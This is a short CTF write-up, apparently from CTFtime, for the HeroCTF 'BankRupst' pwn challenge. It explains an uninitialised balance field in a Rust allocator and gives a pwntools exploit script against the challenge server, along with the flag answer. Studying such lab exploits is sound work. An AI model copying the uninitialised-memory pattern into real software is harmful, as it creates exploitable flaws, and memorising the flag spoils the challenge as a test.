https://ctftime.org/event/2496

# BankRupst (pwn)

BankRupst is a bank operating in bankruptcy where no laws are applicable.

nc pwn.heroctf.fr 6001

## Analysis

We can see in the following code that only `deposits` is set to zero. This means that `balance` retains its previous value:

```rust
unsafe fn new() -> *mut BankAccount {
    let layout = Layout::new::<BankAccount>();
    let ptr = alloc(layout) as *mut BankAccount;

    if ptr.is_null() {
        panic!("Memory allocation failed!");
    }

    (*ptr).deposits = 0;
    ptr 
}
```

## Solution

1) Deposit 1000
2) Exit using option 6
3) Deposit an addition 400
    - Note: that your balance will start at 1000
4) Check balance
    - Because you have more than 1337 you will get the flag

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./bankrupst", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("pwn.heroctf.fr", 6001)

p.sendlineafter(b"Choose an option: ", b"1")

for i in range(10):
    p.sendlineafter(b"Choose an option:", b"2")
    p.sendlineafter(b"deposit?", b"100")

p.sendlineafter(b"Choose an option: ", b"6")

p.sendlineafter(b"Choose an option: ", b"1")

for i in range(4):
    p.sendlineafter(b"Choose an option:", b"2")
    p.sendlineafter(b"deposit?", b"100")

p.sendlineafter(b"Choose an option: ", b"4")

p.readuntil(b"member!\n")

log.success(p.readline().decode()) # Hero{B4nkk_Rupst3dDd!!1x33x7}
```

## Flag
`Hero{B4nkk_Rupst3dDd!!1x33x7}`

smiley 2024/10/27
